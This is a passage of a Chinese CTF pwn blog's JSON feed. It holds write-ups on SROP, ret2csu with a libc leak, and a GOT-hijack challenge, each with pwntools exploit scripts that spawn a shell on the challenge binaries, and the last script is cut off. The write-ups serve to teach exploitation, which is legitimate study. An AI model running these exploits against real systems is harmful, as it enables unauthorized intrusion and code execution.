data-num=\"46\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400501</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\"># 00000000004004DA                 mov     rax, 0Fh</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sigreturn  <span class=\"token operator\">=</span> <span class=\"token number\">0x4004DA</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输sigframe之前======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输sigframe之后======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>需要设置架构</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>execve:</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsigframe = SigreturnFrame()</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsigframe.rax = constants.SYS_execve</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsigframe.rdi = binsh </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tsigframe.rsi = 0x0</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tsigframe.rip = syscall</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>read:</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tframe =  SigreturnFrame()</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tframe.rax = constants.SYS_read</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tframe.rdi = 0</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tframe.rsi = stack_addr</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tframe.rdx = 0x400</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tframe.rsp = stack_addr</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tframe.rip = syscall_addr</pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>x64 more information:</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\thttp://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigfram）</pre></td></tr></table></figure><p>当传入 pl2 我们调试发现寄存器的变化</p>\n<p>可见 srop 的攻击原理</p>\n<p><img data-src=\"/img/srop/image-20230803224211151.png\" alt=\"\"></p>\n<p><img data-src=\"/img/srop/image-20230803224917202.png\" alt=\"image-20230803224917202\"></p>\n<p><img data-src=\"/img/srop/image-20230803224304825.png\" alt=\"image-20230803224304825\"></p>\n",
            "tags": [
                "rop",
                "srop"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/03/csu/",
            "url": "https://yhuanhuan01.github.io/2023/08/03/csu/",
            "title": "csu",
            "date_published": "2023-08-03T11:47:18.000Z",
            "content_html": "<h1 id=\"中级rop_csu\"><a class=\"markdownIt-Anchor\" href=\"#中级rop_csu\">#</a> 中级 ROP_CSU</h1>\n<p><strong>ret2csu</strong> 泄露 libc 地址之后利用 libc 中的 gadget getshell. <strong>ret2csu</strong> 配合 pop rax; syscall; 等 gadget 直接 GetShell. 开启 PIE 的情况下，利用 offset2lib 进行<strong> ret2csu</strong>, 或者直接利用 libc 中的 gadget getshell.</p>\n<p>只要动态连接都会有 _libc_csu_init 函数</p>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9tZWRpdW0tcm9wLyNfMQ==\">¶</span></h3>\n<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>\n<p>gadget1_先执行</p>\n<ul>\n<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n</code></pre>\n<p>我们通常会把 rbx 的值设置成 0，而 rbp 设置成 1. 这样的目的是在执行 call qword ptr [r12+rbx*8] 这个指令的时候，我们仅仅把 r12 的值给设置成指向我们想 call 地址的地址即可，从而不用管 rbx。</p>\n<p>又因为这三个指令 add rbx,；cmp rbx, rbp；jnz short loc_400600，jnz 是不相等时跳转，我们通常并不想跳转到 0x400580 这个地方，因为此刻执行这三个指令的时候，我们就是从 0x400600 这个地址过来的。因此 rbx 加一之后，我们要让它和 rbp 相等，因此 rbp 就要提前被设置成 1.</p>\n<p>然后<strong> r12 要存放的就是指向（我们要跳转到那个地址）的地址</strong>。这里有个很重要的小技巧，如果你不想使用这个 call，或者说你想 call 一个函数，但是你拿不到它的 got 地址，因此没法使用这个 call，那就去 call 一个空函数（_term_proc 函数）（并且要注意的是，r12 的地址填写的并不是_term_proc 的地址，而是指向这个函数的地址）。</p>\n<p>然后 r13,r14,r15 这三个值分别对应了 rdx,rsi,edi。这里要注意的是，r15 最后传给的是 edi, 最后 rdi 的高四字节都是 00，而低四字节才是 r15 里的内容。（也就是说如果想用 ret2csu 去把 rdi 里存放成一个地址是不可行的）</p>\n<p>gadget2_后执行</p>\n<ul>\n<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>\n</ul>\n<p>此时开始执行这部分代码，这没什么好说的了，就是把 r13,r14,r15 的值放入 rdx,rsi,edi 三个寄存器里面。</p>\n<p>然后由于我们前面的 rbx 是 0，加一之后等于了 rbp，因此 jnz 不跳转。那就继续向下执行，如果我们上面 call 了一个空函数的话，那我们就利用下面的 ret。由于继续向下执行，因此又来到了 gadget1 这里。</p>\n<p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充 56（7*8 你懂得）个垃圾数据即可。</p>\n<p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐 56 字节的数据，以便我们执行最后的 ret，最后 ret 去执行我们想要执行的函数即可。</p>\n<pre><code class=\"language-Python\">.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n</code></pre>\n<ul>\n<li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n</code></pre>\n<p>做一个稍微简单一点的 ret2libc 题目：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3Byb2JsZW0vMjk2Mw==\">题目链接：ret2csu</span></p>\n<p><img data-src=\"/img/csu/1280X1280.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/1.PNG\" alt=\"img\"></p>\n<p>可以看出，和别的题没什么特别之处。</p>\n<p><img data-src=\"/img/csu/2.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/3.PNG\" alt=\"img\"></p>\n<p>很明显能够看出在 vuln 处的 read 函数有栈溢出漏洞。pad 为 0x100+8 找一下有没有后门（题目给出 libc 文件，那么一般都是没有后门的）</p>\n<p><img data-src=\"/img/csu/9fb1273e-c627-4f55-9543-5703e4616f76.png\" alt=\"img\"></p>\n<p>没有 system 调用，那么我们需要去单独泄露函数的真实地址，去计算 system 地址。我们可以用 ROPgadget 去看一下我们能不能用基本的 ROP 链去泄露地址，这里我们可以泄露 write 函数的真实地址或 read 函数的真实地址。</p>\n<pre><code class=\"language-Python\">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n</code></pre>\n<p>本身想用这个 gadget 去获取真实地址但是</p>\n<pre><code class=\"language-Python\">payload = pad + p64(pop_chain) + p64(1) + p64(write_got) + p64(8) + p64(0) + p64(write_plt) + p64(main_addr)\n</code></pre>\n<p>上面构造的 payload 并不能得到地址</p>\n<p>所以老老实实的去用 csu 去做这个题吧。</p>\n<p><img data-src=\"/img/csu/9812e1fa-bbb4-409c-b30b-04675e83af54.png\" alt=\"img\"></p>\n<p>gadget_1 = 0x4012AA</p>\n<p>gadget_2 = 0x401290</p>\n<p>但是这里有趣的是跳转的地址是用 r15+rbx*8 所以只需要注意的一点 r15 附到我们想跳转到地址就行。</p>\n<pre><code class=\"language-Python\">payload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\nfrom pwn import *\ncontext.log_level = 'debug'\ndebug = 0\nif debug :\n        p = process('ret2csu')\nelse:\n        p = remote('node1.anna.nssctf.cn',28119)\n\nelf = ELF('ret2csu')\n\ngadget_1 = 0x4012AA\ngadget_2 = 0x401290\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\nprint(hex(write_got))\nmain_addr = elf.symbols['main']\nprint(hex(main_addr))\npop_rdi = 0x04012b3\n# pop_chain = 0x00000000004012ac\nret = 0x040101a \npad = b'a'*(0x100 + 0x8)\npayload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\n\np.recvuntil('Input:\\n')\np.sendline(payload)\nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nlibc = ELF('libc.so.6')\nbase = write_addr - libc.sym['write']\nsys = base + libc.sym['system']\nbin_sh = list(libc.search(b'/bin/sh'))[0] + base\npayload1 = pad + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(sys)\np.recvuntil('Input:\\n')\np.sendline(payload1)\n\np.interactive()\n</code></pre>\n<h3 id=\"插序-gdb-一些用法\"><a class=\"markdownIt-Anchor\" href=\"#插序-gdb-一些用法\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4OTIzMw==\">插序 gdb 一些用法</span></h3>\n<h4 id=\"x命令\"><a class=\"markdownIt-Anchor\" href=\"#x命令\">#</a> X 命令：</h4>\n<p>可以使用 examine 命令 (简写是 x) 来查看内存地址中的值。x 命令的语法如下所示：</p>\n<p>x/&lt;n/f/u&gt;</p>\n<p><strong>n、f、u 是可选的参数。</strong></p>\n<p>n 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的 u 定义。</p>\n<p>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是 s，如果地十是指令地址，那么格式可以是 i。</p>\n<pre><code>x 按十六进制格式显示变量。\nd 按十进制格式显示变量。\nu 按十六进制格式显示无符号整型。\no 按八进制格式显示变量。\nt 按二进制格式显示变量。\na 按十六进制格式显示变量。\nc 按字符格式显示变量。\nf 按浮点数格式显示变量。\ns 按字符串显示。\nb 按字符显示。\ni 显示汇编指令。\n</code></pre>\n<p>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。u 参数可以用下面的字符来代替，b 表示单字节，h 表示双字节，w 表示四字 节，g 表示八字节。当我们指定了字节长度后，GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p>\n<p>x /10gx 0x123456 // 常用，从 0x123456 开始每个单元八个字节，十六进制显示是个单元的数据</p>\n<p>x /10xd $rdi // 从 rdi 指向的地址向后打印 10 个单元，每个单元 4 字节的十进制数</p>\n<p>x /10i 0x123456 // 常用，从 0x123456 处向后显示十条汇编指令</p>\n",
            "tags": [
                "csu",
                "rop",
                "gdb"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "url": "https://yhuanhuan01.github.io/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "title": "国赛复现",
            "date_published": "2023-08-03T09:17:58.000Z",
            "content_html": "<h1 id=\"国赛题复现\"><a class=\"markdownIt-Anchor\" href=\"#国赛题复现\">#</a> 国赛题复现</h1>\n<p>不同地区的国赛题，进行复现。— 简单 pwn 题</p>\n<h3 id=\"华北赛区\"><a class=\"markdownIt-Anchor\" href=\"#华北赛区\">#</a> 华北赛区：</h3>\n<h3 id=\"relro保护机制\"><a class=\"markdownIt-Anchor\" href=\"#relro保护机制\">#</a> RELRO 保护机制</h3>\n<p><strong>1.RELRO 的保护机制可用于防护 <code>GOT hijacking</code> ，其全名为 <code>Relocation Read-Only</code> 。</strong></p>\n<p><strong>2. 本题中 <code>checksec</code>  中为 <code>Partial RELRO</code> ，这种情况下， <code>GOT</code>  可写，即存在 <code>GOT hijacking</code>  的漏洞</strong></p>\n<p><strong>3. 而保护的方式是设置为 <code>Full RELRO</code> ，这种情况下不会出现 <code>lazy binding</code> ，因为在 <code>Load time</code>  时会将所有 <code>funciton resolve</code>  完毕，并设置 <code>GOT</code>  不可写。</strong></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090133980.png\" alt=\"image-20230717090133980\"></p>\n<p>给到的附件是这两个。</p>\n<h5 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090248188.png\" alt=\"image-20230717090248188\"></p>\n<p>开启了堆栈不可执行和 pie 保护。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090403892.png\" alt=\"image-20230717090403892\"></p>\n<p>普通的执行并没有发现什么东西</p>\n<h5 id=\"放入ida\"><a class=\"markdownIt-Anchor\" href=\"#放入ida\">#</a> 放入 IDA</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/OLUQRFR5HLPTU%258MV3M%259%5DR.png\" alt=\"img\"></p>\n<p>这是给到的几个函数</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090604786.png\" alt=\"image-20230717090604786\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090621694.png\" alt=\"image-20230717090621694\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090637164.png\" alt=\"image-20230717090637164\"></p>\n<p>这是其中有用的函数，接下来进行分析</p>\n<ol>\n<li></li>\n</ol>\n<p>其中 v2 数组在他的索引 0 的位置有 puts 函数的地址。</p>\n<p>main 函数显示调用了 96B 这个函数，96B 内有个 scanf 函数，他的参数是 %252s，这里要记住，要用到，往下看，还有是 sacnf，这里主要是绕过判断的。只要绕过这个判断，我们就能得到 v2 的索引 0 处的地址。</p>\n<p><strong>参数 % s</strong><br>\n<strong>% s 参数在 PWN 题中的应用应该是最常见的了。scanf (“% s”, a) 实际上与 gets 一样危险，均不会检查 a 的边界，出现在题中一定是一个可以进行栈溢出或堆溢出的重点。这里注意其与 read 函数相同，可以读取 \\x00 后面的内容，仅将换行作为输入读取的结束标志。不过这里要注意的是，% s 参数会以空格作为分隔符，也就是说，如果输入中含有空格，那么空格前后的内容会被分配到不同的 % s 参数中。这一点在使用 scanf 进行溢出时需要注意，否则容易造成 ROP 链断裂等问题。</strong></p>\n<p>里面 V4 是个局部变量，这样我们可以利用第一个 scanf 把它覆盖成 0。第一个函数我们思路有了，接下来就是第二个函数的思路。</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>第三个 scanf，这是用来绕过判断的。一共有两个 read 函数，第一个 read 函数没啥用，有意思的就是第二个 read 函数。</p>\n<pre><code>栈中的数组越界：\n因为栈是向下增长的，在进入一个函数之前，会先把参数和下一步要执行的指令地址（通过call实现）压栈，在函数的入口会把ebp压栈，并把esp赋值给ebp，在函数返回的时候，将ebp值赋给esp，pop先前栈内的上级函数栈的基地址给ebp，恢复原栈基址，然后把调用函数之前的压入栈的指令地址pop出来（通过ret实现）。\n栈是由高往低增长的，而数组的存储是由低位往高位存的，如果越界的话，会把当前函数的ebp和下一跳的指令地址覆盖掉，如果覆盖了当前函数的ebp，那么在恢复的时候esp就不能指向正确的地方，从而导致未可知的情况，如果下一跳的地址也被覆盖掉，那么肯定会导致crash。\n</code></pre>\n<p>所以通过第二个 read 函数，去控制修改地址。首先就是去做到覆盖，这种覆盖也是第一次见，是看 bss 段里大小去覆盖。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143008203.png\" alt=\"image-20230717143008203\"></p>\n<p>覆盖 0x1c 字节大小，覆盖完后去修改地址，但是因为 v0 是通过 rax 去存参的，所以需要去传两遍参，正好有两次传参机会，我们可以去修改 close 函数，变成一个我们想要去程序执行的函数。</p>\n<p>这里我们要重新返回执行 A31 这个函数，接下来就是重头戏，去修改 got 表。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143729215.png\" alt=\"image-20230717143729215\"></p>\n<p>非常关键一点就是这里，我们可以修改 strlen 函数，变成 system 函数，在给他传个 bin/sh 即可</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'split'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    io <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'challen'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Good luck!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'22'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>strlen_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'strlen'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>strlen_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'index>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># gdb.debug()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span 